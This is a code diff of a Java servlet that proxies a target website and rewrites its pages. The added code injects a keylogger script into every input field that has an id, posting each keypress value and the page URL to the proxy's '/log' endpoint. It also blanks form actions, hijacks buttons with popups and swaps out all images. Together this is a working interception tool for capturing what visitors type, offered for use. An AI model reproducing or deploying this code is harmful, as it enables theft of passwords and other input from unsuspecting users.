@@ -7,6 +7,7 @@ import java.io.OutputStreamWriter;
 import java.net.HttpURLConnection;
 import java.net.MalformedURLException;
 import java.net.URL;
+import java.nio.charset.Charset;
 import java.util.ArrayList;
 import java.util.Iterator;
 import java.util.List;
@@ -43,27 +44,38 @@ public class WebsiteProcessor {
 	}
 	public void processRequest(HttpServletRequest request, HttpServletResponse response, ClientInfo ci) throws IOException{
 		ci.setBase(request.getParameter("url"));
-		String endPoint = request.getRequestURI();
-		String url = "https://"+ci.getBase()+endPoint;
-		
+		String html = "";
+		String[] protocols = {"https://","http://"};
+		RequestInfo ri = new RequestInfo();
+		String url = "";
+		int i=0;
+		while(html.equals("") && i<2){
+			String endPoint = request.getRequestURI();
+			url = protocols[i]+ci.getBase()+endPoint;
+			
+			String query = request.getQueryString();
+			if(query!=null && !query.equals("null")){
+				url+="?"+query;
+			}
+			ri.url = url;
+			try {
+				html = getRawResponseAndSetBasic(ri,"GET",request,response,ci);
+			} catch (IOException e) {
+				// TODO Auto-generated catch block
+				//e.printStackTrace();
+			}
+			i++;
+		}
 		//redirect if not targeted
-		if(!config.targetURL.equals(ci.getBase())){
+		if(!config.targetURL.contains(ci.getBase())){
 			System.out.println(url);
 			response.sendRedirect(url);
 			return;
 		}
-		
-		String query = request.getQueryString();
-		if(query!=null && !query.equals("null")){
-			url+="?"+query;
-		}
-		RequestInfo ri = new RequestInfo();
-		ri.url = url;
-		String html = getRawResponseAndSetBasic(ri,"GET",request,response,ci);
 		String modifiedHtml = processHTML(ri, html, url.contains(".js"),ci);
 		response.getWriter().write(modifiedHtml);
 	}
-	public String processHTML(RequestInfo ri, String html,boolean isJS,ClientInfo ci) throws MalformedURLException, IOException{
+	public String processHTML(RequestInfo ri, String html,boolean isJS,ClientInfo ci){
 		String html1 = html;
 		
 		if(isJS){
@@ -108,13 +120,52 @@ public class WebsiteProcessor {
 		if(config.keylogger){
 			addKeylogger(ri,doc);
 		}
+		//popup message
 		if(config.popUpMessage!=null && !config.popUpMessage.equals("")){
-			//TODO
+			addPopUpMessage(ri,doc);
 		}
+		//replace image
 		if(config.imageURL!=null && !config.imageURL.equals("")){
-			//TODO
+			changeAllImages(ri,doc);
 		}
 		return doc.toString();
+	}
+	private void changeAllImages(RequestInfo ri, Document doc) {
+		Elements images = doc.select("img");
+		for(Element image:images){
+			image.attr("src",config.imageURL);
+		}
+	}
+	private void addPopUpMessage(RequestInfo ri, Document doc) {
+		String msg = config.popUpMessage.replaceAll("'", "\\\\'");
+		msg = msg.replaceAll("\"", "\\\\\"");
+		Elements forms = doc.select("form");
+		for(Element form:forms){
+			form.attr("action","");
+		}
+		Elements buttons = doc.select("input[type=submit]");
+		buttons.addAll(doc.select("input[type=button]"));
+		buttons.addAll(doc.select("button"));
+		for(Element button:buttons){
+			String clickEventHandler = "alert('"+msg+"');";
+			button.attr("onclick",clickEventHandler);
+		}
+	}
+	private void addKeylogger(RequestInfo ri,Document doc){
+		Elements inputs = doc.select("input");
+		for(Element input:inputs){
+			if(input.attr("id")!=null && !input.attr("id").equals("")){
+				String keyString ="'"+input.attr("id")+"'";
+				String valueString = "$('#"+input.attr("id")+"').val()";
+				String var = "var d = {url:'"+ri.url+"',key:"+keyString+",value:"+valueString+"};";
+				String ajaxString = "$.ajax({url:'/log',type: 'POST',data:d})";
+				String complete = "<script> $( '#"+input.attr("id")+"' ).keypress(function() {"+
+				var+
+				ajaxString+
+				"}) </script>";
+				doc.append(complete);
+			}
+		}
 	}
 	public String getRawResponseAndSetBasic(RequestInfo ri,String method,HttpServletRequest request, HttpServletResponse response,ClientInfo ci) throws IOException{
 		String link = ri.url;
@@ -143,6 +194,10 @@ public class WebsiteProcessor {
 		}
 		conn.connect();
         
+		if(conn.getResponseCode()!=200){
+			throw new IOException("Page was not retrieved correctly!");
+		}
+		
         OutputStreamWriter wr = null;
         BufferedReader rd  = null;
         String line = null;
@@ -154,7 +209,7 @@ public class WebsiteProcessor {
         }
         
         //read the result from the server
-        rd  = new BufferedReader(new InputStreamReader(conn.getInputStream()));
+        rd  = new BufferedReader(new InputStreamReader(conn.getInputStream(),Charset.availableCharsets().get("UTF-8")));
         
       
         while ((line = rd.readLine()) != null)
@@ -178,21 +233,5 @@ public class WebsiteProcessor {
 			}
 		}
 		return out;
-	}
-	private void addKeylogger(RequestInfo ri,Document doc){
-		Elements inputs = doc.select("input");
-		for(Element input:inputs){
-			if(input.attr("id")!=null && !input.attr("id").equals("")){
-				String keyString ="'"+input.attr("id")+"'";
-				String valueString = "$('#"+input.attr("id")+"').val()";
-				String var = "var d = {url:'"+ri.url+"',key:"+keyString+",value:"+valueString+"};";
-				String ajaxString = "$.ajax({url:'/log',type: 'POST',data:d})";
-				String complete = "<script> $( '#"+input.attr("id")+"' ).keypress(function() {"+
-				var+
-				ajaxString+
-				"}) </script>";
-				doc.append(complete);
-			}
-		}
 	}
 }
